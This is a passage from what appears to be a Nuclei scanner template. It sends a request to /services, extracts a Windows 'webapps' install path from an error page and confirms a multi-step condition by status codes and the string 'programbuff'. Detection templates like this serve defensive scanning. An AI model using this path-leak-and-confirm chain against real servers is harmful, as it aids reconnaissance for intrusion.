        GET /services HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body_1
        name: path
        internal: true
        regex:
          - "[a-zA-Z]:\\\\(?:[^\\\\/:*?\"<>|\\r\\n()]+\\\\)*[^\\\\/:*?\"<>|\\r\\n()]+\\\\webapps"

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 500 && status_code_2 == 200 && status_code_3 == 200
          - contains(body_3,'programbuff')
        condition: and

      - type: dsl
